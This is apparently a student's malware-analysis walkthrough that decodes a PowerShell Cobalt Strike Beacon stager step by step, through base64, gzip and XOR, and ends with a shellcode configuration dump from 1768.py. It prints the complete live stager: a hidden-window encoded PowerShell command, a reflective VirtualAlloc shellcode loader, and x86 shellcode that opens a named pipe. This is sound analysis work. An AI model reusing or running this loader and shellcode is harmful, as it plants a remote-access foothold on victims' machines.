# Powershell Cobalt Strike Beacon

short brief: **BEACON** is the name for cobalt strike's malware payload used to create a connection to the attacker. i will share the sample of the payload based on my previous analysis during internship.

<figure><img src="../.gitbook/assets/Screenshot 2025-03-06 232621.png" alt=""><figcaption></figcaption></figure>

```powershell
%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand
"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA2ADEAVwBiAFcALwBpAE8AQgBEACsAWABIADYARgBQADEAUgBLAG8AZwBJAEwAcABkAHUAVwBuAGkAbwB0ADcANABRAEQAeQBqAGEAMABTADUAZABGAHkARABnAE8ARABRADAAeAAyAEUANABnADMAZAAzAC8AZgB1AE8ARQBzAFAAVABhADMAcQAxADAAVgB3AG4AVgBzAFcAZgBHAE0AOAA4ADgATQAyAE8ATAB5AHAAdwBsAHUAVQB0AGsAagA5AGsAVQA1AGUANABwAEYAeQA3AHoAMABXAGsAbQBjADEAeABuAHAAawBUAFgANgBKAE8AVwBjAFEASwBmAFMATABXAHQARgB0AE0ANQBsAGQATQBWAFoAMgBTAEsAYgBaAHQAVABJAGQARAAzAHoATgBFAEEAYwA3AHgARQArAG4ARwBJACsAWABUAEoANwBNAEMAagBXAFIAUgAvAEsARQBGAHEAQgA1AHcAYQBSADAAZQBaAG8AMwBnAHIAOABBAFYAMgA2AE4AVABIADAAZwAzAHAAZABFAG4AbABJADcATQBGAFgASwBTAFAASwA2AHQAVgBuAFMAMgB4ADYAMAArAHUAcgBtAG8AQgA1ADkAUwBYAHkAWABlACsAUgBXAFYARgBDAEwAcQBjAGUAUwA0AFYAdQBvAEYAKwBvAEMAKwBQAGwATgBQAGMAegBXAHgAQgBpAFUAVABmADAAZgBFADAAMwAvAEwAWQBEAEgAcwA3AHMAYQBpAEcAeQBTAE0ARQBWAFAARgB0AGQAZABaAGwAQgBLAHMASQA4AHQAYgBLAGMANgBXAHUAZgBmAHUAbQBHAGUATgBjAGMAWgBKAHYAcgBBAFAAcwBDAFYAMgB6AEkAaQBIAHAATQBtADkANwBuAG0AYQBnAG4ANABhADYAYwBCAGkAdABxAEsANwAxAFgATQBLAFoAWQBJADcATQBmADMASAA5ADAAbQBuACsATAB2AGEAKwBIAHoAdgBmAFMAMwB6AFgAagBGADEAawA4AHgAVwBHAE8ATgA0AFAAVQBsAGwATgBkAEgAUQBOAGwAZwBQAEEAcABwAEoAZwBxAEcAWABSAFcATgAwADMAbgBrAHoAUQBwADcAMAAzAHQANABFAHYAMwBTAFgATgBtADcANgBrAG4ASwAwAHMAeQBrAE8AWABVAEoARgB2AFkAOQAvADIANgBDADEAMQBRAEUAMABUAGsARAA1AC8AcgBoAG4AZwBCAEsAYwB5ADQARAA1AEsAZgBRAEcAOQBrAEQAMQBSAC8AZABnAFAAUABDADgATABkAHMAZQAvAGEAMwBlAGkAOQArAGsAbQBCAGYAZAAzAGwAZgBSAEQASgBaAEEAYQBTAEcANQBrAGQANQB6ADQASABUAGgANgBNAFcAOABTAGMAeABEAE8ASwArADgAUAB5AEcAWABBADMAeQB1AEMARwBaAG0AZgBtAFQAZQBvAGEAbABPAFAAegByAEcAawBVAHcAbgA0AEgAbgBBADEAYwAzAFEAMABqAHAAYwBVADQAdABFAEgAVABMAGkAeAAzAGoAVQBxAFoARgBFAFAAbgBNAEMAUwA4AFUAaQBsAGMAOABnAEQAYQBrAHgAKwA1AFMAZQA1AE4AdABVAFUAMgBYAGMATgBGAFYATwB0AG4AVQA2AFMAbgBzAFMAUABhAHoAUwArAFoANgA0ADkAeQBSAHcAWgBtAFIAMQA3ADEAUAA1ADAARgByAGkAZQBUAGIAawA2AGYANwA4AGEANgB0AFIAeABmAFYAcQBQAGYATAB4ADAAUwBVAHAANAAvAGEAMgBjAFUAYwBlAGoATQBSADcANQBWAEsAdwBQAGYAdQByAGEANwBvAEQAYQA5AFIAMAA2AG0AZwBKADAALwBGAHEAdABzAFgAVABsAFgAcgBlAGEATwBGAGMAaABrAEgAYwBCAFgAZwBFAGwAagBKAGYATwBKAEQAbgBVAE4AZABQAHYAMABTAFgAZwBsADMAdwBEAFQAWQA4AGQASwBEAE8AYQBTAHUAOQBLAEsAMABwAHYAVgA5ACsASwB5AHoAVQBQAEMANQBGAEYAZwB3AEQAcQBuAEcAUwBSAFIAYgBGAEgANwBTAHkAcQArAE0ATABkAEgAVgBVAEMAeQBlAEsAbAA5AHMAdgBkAFgAdQBCAEoAbAAyAEEAaABVADMATQBUADQAdwAxAEkAZAAxAGYAWABtAEEAOABWAEUAeABEAEkATABzAEEAdwB0AEYAYQBVAHUATgBoAFQAcQBHAFIAUgAyADcAVgBwAE4AYgBMAGMAZQBlAHEAQwA5AGkAWQBtAE4AZQB4ADUAVQBIAEoAZwBLAFkAUwBjAHcASQA3AEMAdwBwAEsASwBNADkAegBPAC8AcAAwAGYAUgB0ADYAaQAwAGwAeQB1AFAATABvAEUANgBiAGcATABOAFQAMAA4AGgANQA2AHoAcQA2AGkAWQBiAG4AaABPAGIAZQAwAGYAMwBFADcAcgBKAEMAawBLAGgAVgBVAEsAMABvAEgAVABRAEEARABMAFkAegBLAEwANwBsADAAdQBvAGEAOQBwADIAVgBmAEUAKwAyAC8AdQB2AFcAdwB4AEwAOQB5AHMAYwBiAHAATABwAEIANABYADQAcgBnAGEAUwBWAFUAdQBzAFMAUgBSAHcAKwBWADYAagAyAFcATQBIAEoAZQBBAFcAcABPAHoAWgBSAFUATABlAG4ANQBtAHgAVwAxAE0AMQAwAHEAWAB3AGQAcQBNAGUAbwB2AFAANQA3AHoAVgBDAEoAdgB0AGQAYgBzAHgAaABGADgASQB2ADkASwA2ADIAZQBoADIATwA3AGUAcgA2AG0AMgBYAE4ASQBLAGIAUQBiAHYAUQBjAGMAegBQAGwALwBXAHoAWQBCAE8AWQB3AGIAQgBhAEsARABVAEwASQBQAGUAOABiAGoAVQBjAE0ANwB4AGgARAA4AFYAZwBlAFYAYQAwAFYAMgBiAFkAaAB6ADEAeABzAFcANgBMAHUAaABuAFcASwArADMAVABOAFcAdQBlAHoAOQAzAHkAegBrADYAaQAvADMAbQAyAEsAYwA1AEcAWgB2AE4AaQAxAG0AcQBlAHQAZQA5AEYAVQA4AG0AMwB6AGIARABhAFgATgBmAEsARABOAFkAZgB6AEwARABHAE8AcQBCADMAZQBiADcAeQBxAHgAdgA3AGoARABZADYANQAzAFQAVQBKAFoAdQBTAHYASwBSADQAdgBvADMAKwB2AEQAOQBwAEIAUAAzAE8AUQAwAEUAcwBlAGgAQwBEAFYAWAA0AG0AbgBWAHEALwBZAHgAYgBrAHgAVwBPAHAAMwBpAG8ATgB2AGoANQBIAFQAQwB6AE0AcQBQACsAeABFAGEAdwBpADgAaQBRAFcAVAB4AEYAWgBXAE4ASABOAHMAQgBPAEIAMwBOAE8AVABaADEAbgBWAHIAWABYADYAZABmAGgAaAA0AEoAQwB5AGYAOABQADYARwA3AHQAagBsAHAAcgBkAFcAbQBGAEwATgAvAGIAegA2AFMAcgBvAGoANABaADMAVAB3AHYATABBAHYAbAB6ADMAbQBRADMAZAAvADUAYQB0AE8AWgBuAFYAcwBCAEcARwB4AEwAQwBmAHQARwB5ADcASwAwAE4AZwBZAFcAagA2AEsARQAwAHcATQB6AGUAawBPAGQANABQACsAcgBWADQAZQA3AEQATQA4AEMASABsAE4AYQB0AHkAegBiAEUANQBWAGUAagBMAGwAKwA3AEIARABBAG4ANwBWADcAVQBmAFkAdwBHAFYAbQB6AFQAYgBvAFMATABVACsAZgBDAEEAZgA4AEwAMQBzAG0AWAA0AHEAcgBkAEoAdQBVADEAeQBKADgALwBoAHQAVgBJADQARABPAFAAUABGAG4AbABtAHkALwB6ADAAWQBpAFUANQBiAFoAZABmAFIANQAwAFMAZgArAFoAbABOAHIAbABEAC8AVgBSAGUAVwBoADUALwBaAFoAVABLAEEANQB2ADcANgB1AFgAagBkAHUASABCAGIAawBzACsATQBYADUAOQBiAFYAaQBsAE0ATQA0AHoASQBpAHQANgByAHQALwBJAFAAaQBmADgAeQBUAGEAYwB3AGEAWQBBAGkAUgBVACsAeQBjAG4AaAB1AHIAZAArADUAUAB4ADgAWABhAFMAegB0AHIAOQBkADIANgAyAEIAVwB1AGwAagA0AHAALwA4AFUAbQBJAEQAMQBqADMAMwBnAEQAcgBZAFMANABlAHMAUQBkAHMAaABDAEcAVQB0AHAAQQBtADQAOAAzAGQASwBCAGsAdwBWADIAbgBvACsAdAB1AHYAbgB5AGYASwBmAGUAcgBCAHkAdwBEAGUARABtAG4AaABWAFQAeQBQAEUAVABYADgAMwBwAGwAQwBNAEkAcQBUAEEAVABtAEIAQgBuAE0ASAB5ADkATABwAG0AeQBzAEQANwBRAFYAaAA0AGkAVQB4AHoAUQBMAEgAaQBRAGYARQBMAHMASgAwAFQAcQBhAEMAVgAxAGQAZgBJAGIAegBzAEEAWQBoAGQANgBzAC8AbABZAHgAWQBWAHQAcQBWAEMAbwBhAEQAKwBuAHgAVwBNAHoATwAvAEQAVQBtAE8AcgBTAE4AKwBiAHkANgBvAEIAZQBlAEQASgA0AFUAMQBlAGYASgBPAHgAUQA1ADgASAAvAHAATAArAGoAdwBsADQAYwBlAG0ALwBRADYAdgBBAGkAMgBmAHMASAByAHIAWQBvAGIAZgB4AE0AagBMAGEAcAAwAHoARwBkAE4ARABCAHYAbgBDAGYANABRAFYASgAxACsAZwB5ADUAcAA2AFEAbQBNAHYAYwBnAHMAMwBnAHUAUgBuADMAVAAvADAAWQBHADgAaABzAGoATgBBAHgAUgBqADkAUgBEAHMASwByAGkATgBJAHAAdgBEAG4ANQBQAEYARABOAEYAQwBWAFAANgBCADkAbwBnADkAMQBFADgAUQBlADYAcABZAFQAQwBFAHkAagBYAFkAVABOAGcASwBZAFcAWgBxAEUAegBIAFIAcABRAHcANwBQADAARgBCAGkANAB3AEgAWgBNAEwAQQBBAEEAPQAiACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=="
```

this payload above is a component of the BEACON malware. It is encoded with base64 format and it compressed with Gunzip (gzip) to evade detection.



before we started, take a look at the picture below.

<figure><img src="../.gitbook/assets/image (27).png" alt="" width="563"><figcaption></figcaption></figure>

this is the flow on how to decode the powershell payload. based on our situation, we use the second flow which is **decode base64 - decompress - payload**.

## Decode the payload using cyberchef

we are using [**cyberchef**](https://gchq.github.io/CyberChef/) to decode the payload. &#x20;

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

the output generated looks a bit cleaner and understandable now. it says:

```powershell
$s = New-Object IO.MemoryStream(, 
[Convert]::FromBase64String(
"H4sIAAAAAAAA/61WbW/iOBD+XH6FP1RKogILpduWniot74QDyja0S5dFyDgODQ0x2E4g3d3/fuOEsP
Ta3q10VwnVsWfGM888M2OLypwluUtkj9kU5e4pFy7z0Wkmc1xnpkTX6JOWcQKfSLWtFtM5ldMVZ2SKb
ZtTIdD3zNEAc7xE+nGI+XTJ7MCjWRR/KEFqB5waR0eZo3gr8AV26NTH0g3pdEnlI7MFXKSPK6tVnS2x
60+urmoB59SXyXe+RWVFCLqceS4VuoF+oC+PlNPczWxBiUTf0fE03/LYDHs7saiGySMEVPFtddZlBKs
I8tbKc6WuffumGeNccZJvrAPsCV2zIiHpMm97nmagn4a6cBitqK71XMKZYI7Mf3H90mn+Lva+HzvfS3
zXjF1k8xWGON4PUllNdHQNlgPAppJgqGXRWN03nkzQp703t4Ev3SXNm76knK0sykOXUJFvY9/26C11Q
E0TkD5/rhngBKcy4D5KfQG9kD1R/dgPPC8Ldse/a3ei9+kmBfd3lfRDJZAaSG5kd5z4HTh6MW8ScxDO
K+8PyGXA3yuCGZmfmTeoalOPzrGkUwn4HnA1c3Q0jpcU4tEHTLix3jUqZFEPnMCS8Uilc8gDakx+5Se
5NtUU2XcNFVOtnU6SnsSPazS+Z649yRwZmR171P50FrieTbk6f78a6tRxfVqPfLx0SUp4/a2cUcejMR
75VKwPfura7oDa9R06mgJ0/FqtsXTlXreaOFchkHcBXgEljJfOJDnUNdPv0SXgl3wDTY8dKDOaSu9KK
0pvV9+KyzUPC5FFgwDqnGSRRbFH7Syq+MLdHVUCyeKl9svdXuBJl2AhU3MT4w1Id1fXmA8VExDILsAw
tFaUuNhTqGRR27VpNbLceeqC9iYmNex5UHJgKYScwI7CwpKKM9zO/p0fRt6i0lyuPLoE6bgLNT08h56
zq6iYbnhObe0f3E7rJCkKhVUK0oHTQADLYzKL7l0uoa9p2VfE+2/uvWwxL9yscbpLpB4X4rgaSVUusS
RRw+V6j2WMHJeAWpOzZRULen5mxW1M10qXwdqMeovP57zVCJvtdbsxhF8Iv9K62eh2O7er6m2XNIKbQ
bvQcczPl/WzYBOYwbBaKDULIPe8bjUcM7xhD8VgeVa0V2bYhz1xsW6LuhnWK+3TNWuez93yzk6i/3m2
Kc5GZvNi1mqete9FU8m3zbDaXNfKDNYfzLDGOqB3eb7yqxv7jDY653TUJZuSvKR4vo3+vD9pBP3OQ0E
sehCDVX4mnVq/YxbkxWOp3ioNvj5HTCzMqP+xEawi8iQWTxFZWNHNsBOB3NOTZ1nVrXX6dfhh4JCyf8
P6G7tjlprdWmFLN/bz6Sroj4Z3TwvLAvlz3mQ3d/5atOZnVsBGGxLCftGy7K0NgYWj6KE0wMzekOd4P
+rV4e7DM8CHlNatyzbE5VejLl+7BDAn7V7UfYwGVmzTboSLU+fCAf8L1smX4qrdJuU1yJ8/htVI4DOP
PFnlmy/z0YiU5bZdfR50Sf+ZlNrlD/VReWh5/ZZTKA5v76uXjduHBbks+MX59bVilMM4zIit6rt/IPi
f8yTacwaYAiRU+ycnhurd+5Px8XaSztr9d262BWulj4p/8UmID1j33gDrYS4esQdshCGUtpAm483dKB
kwV2no+tuvnyfKferBywDeDmnhVTyPETX83plCMIqTATmBBnMHy9LpmysD7QVh4iUxzQLHiQfELsJ0T
qaCV1dfIbzsAYhd6s/lYxYVtqVCoaD+nxWMzO/DUmOrSN+by6oBeeDJ4U1efJOxQ58H/pL+jwl4cem/
Q6vAi2fsHrrYobfxMjLap0zGdNDBvnCf4QVJ1+gy5p6QmMvcgs3guRn3T/0YG8hsjNAxRj9RDsKriNI
pvDn5PFDNFCVP6B9og91E8Qe6pYTCEyjXYTNgKYWZqEzHRpQw7P0FBi4wHZMLAAA=")); 
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,
[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

as we can see, after we decoded the payload using base64, the payload still has an encoded part in **FromBase64String.**&#x20;

## Decompressed the payload using Gzip

copy the encoded part and paste in into the [**gzip decompress online.**](https://codebeautify.org/gzip-decompress-online)

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

the output generated by the gzip decompress give us much cleaner looks about the payload.

```bash
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+EuNJY0sjMyMjS9zcJCNJI0t7h3DG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT/Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rFoOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHqHcHMyLhyPSoXwcvdEvj2f7f3PZ0S+W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9/DX9TSlNGf01TRVB8ERYjc80n1g==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

another string of looooong characters at <mark style="color:blue;">**$var\_code**</mark>. i highlighted the part below.

```sh
[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+EuNJY0sjMyMjS9zcJCNJI0t7h3DG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT/Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rFoOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHqHcHMyLhyPSoXwcvdEvj2f7f3PZ0S+W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9/DX9TSlNGf01TRVB8ERYjc80n1g==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
```

paste it into cyberchef to see what happen.

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

why didnt we not get the clear look of this payload eventhough we already completed the flow based on the picture above? the reason is the encoded part above is not a script (powershell, batch, javascript etc.) but a shell-code. &#x20;

## Decode the payload using XOR key 35 in Powershell

Paste the part below into the powershell.

```powershell
[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+EuNJY0sjMyMjS9zcJCNJI0t7h3DG3PZzyosjIyN5EupycksjkycjSyOTJyNJIkklSSBxS2ZT/Pfc9nOoNwdJI3FLC0xewdz2puNXTUkjSSNJI6rFoOUnqsGg4SuoXwcvSSN1SSdxdEuOvXyY3PaodwczSSN1SyMDIyNxdEuOvXyY3Pam41c3qG8HJ6gnByLrqicHqHcHMyLhyPSoXwcvdEvj2f7f3PZ0S+W1pHHc9qgnB6hvBysa4lckS9OWgXXc9txHBzPLcNzc3H9/DX9TSlNGf01TRVB8ERYjc80n1g==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

then, copy and paste the command below.

```powershell
 Set-Content -Path ./decrypt.bin -Value $var_code -AsByteStream
```

* **`Set-Content`**: A PowerShell cmdlet used to write content to a file.
* **`-Path ./decrypt.bin`**: Specifies the file to write to — in this case, `decrypt.bin` in the current directory. it can be any filename with **.bin** extension.
* **`-Value $var_code`**: This is the variable (a byte array) that holds the data we want to write.
* **`-AsByteStream`**: Writes the data as **raw binary bytes**, not as text or encoded strings _(this command works in PowerShell 7+ only)._

## Install 1768.py in Github

we will use Github tool to decrypt the payload. this is the link: [https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py)

this tool decrypts and dumps the configuration of Cobalt Strike Windows beacons (PE files), shellcode and memory dumps.  run the command below to start decrypt the payload using the python script.

```powershell
python3 ./1768.py -x ./decrypt.bin
```

and... this is the output after running the script.

```
File: ./decrypt.bin
Found shellcode:
Identification: CS psexec psh x86 shellcode, opens named pipe
Parameter: 344 b'\\\\.\\pipe\\npfs_25'
license-id: 361 1357776117
push      :   148       4096 b'h\x00\x10\x00\x00'
push      :   261       8192 b'h\x00 \x00\x00'
00000000: FC E8 89 00 00 00 60 89  E5 31 D2 64 8B 52 30 8B  ......`..1.d.R0.
00000010: 52 0C 8B 52 14 8B 72 28  0F B7 4A 26 31 FF 31 C0  R..R..r(..J&1.1.
00000020: AC 3C 61 7C 02 2C 20 C1  CF 0D 01 C7 E2 F0 52 57  .<a|., .......RW
00000030: 8B 52 10 8B 42 3C 01 D0  8B 40 78 85 C0 74 4A 01  .R..B<...@x..tJ.
00000040: D0 50 8B 48 18 8B 58 20  01 D3 E3 3C 49 8B 34 8B  .P.H..X ...<I.4.
00000050: 01 D6 31 FF 31 C0 AC C1  CF 0D 01 C7 38 E0 75 F4  ..1.1.......8.u.
00000060: 03 7D F8 3B 7D 24 75 E2  58 8B 58 24 01 D3 66 8B  .}.;}$u.X.X$..f.
00000070: 0C 4B 8B 58 1C 01 D3 8B  04 8B 01 D0 89 44 24 24  .K.X.........D$$
00000080: 5B 5B 61 59 5A 51 FF E0  58 5F 5A 8B 12 EB 86 5D  [[aYZQ..X_Z....]
00000090: 31 C0 6A 40 68 00 10 00  00 68 FF FF 07 00 6A 00  1.j@h....h....j.
000000A0: 68 58 A4 53 E5 FF D5 50  E9 A8 00 00 00 5A 31 C9  hX.S...P.....Z1.
000000B0: 51 51 68 00 B0 04 00 68  00 B0 04 00 6A 01 6A 06  QQh....h....j.j.
000000C0: 6A 03 52 68 45 70 DF D4  FF D5 50 8B 14 24 6A 00  j.RhEp....P..$j.
000000D0: 52 68 28 6F 7D E2 FF D5  85 C0 74 6E 6A 00 6A 00  Rh(o}.....tnj.j.
000000E0: 6A 00 89 E6 83 C6 04 89  E2 83 C2 08 8B 7C 24 0C  j............|$.
000000F0: 6A 00 56 6A 04 52 57 68  AD 9E 5F BB FF D5 8B 54  j.Vj.RWh.._....T
00000100: 24 10 6A 00 56 68 00 20  00 00 52 57 68 AD 9E 5F  $.j.Vh. ..RWh.._
00000110: BB FF D5 85 C0 74 14 8B  4C 24 04 8B 04 24 01 C8  .....t..L$...$..
00000120: 89 04 24 8B 54 24 10 01  C2 EB D7 8B 7C 24 0C 57  ..$.T$......|$.W
00000130: 68 C0 FA DD FC FF D5 57  68 C6 96 87 52 FF D5 8B  h......Wh...R...
00000140: 04 24 8B 4C 24 08 39 C1  74 07 68 F0 B5 A2 56 FF  .$.L$.9.t.h...V.
00000150: D5 FF 64 24 10 E8 53 FF  FF FF 5C 5C 2E 5C 70 69  ..d$..S...\\.\pi
00000160: 70 65 5C 6E 70 66 73 5F  32 35 00 50 EE 04 F5     pe\npfs_25.P...
```

the explanation are in below:

* **Architecture**: 32-bit (x86) shellcode.
* **Type**: Cobalt Strike payload delivered via `psexec` and PowerShell.
* **Execution Method**: Uses Windows API calls to allocate memory, write the payload, and execute it.
* **Communication Channel**: Opens a named pipe `\\.\pipe\npfs_25`.
* **Purpose of Named Pipe**: Acts as a covert channel for staging or internal communication.
* **Behavior**: Silently loads the Cobalt Strike Beacon onto the target, often used for pivoting or post-exploitation.
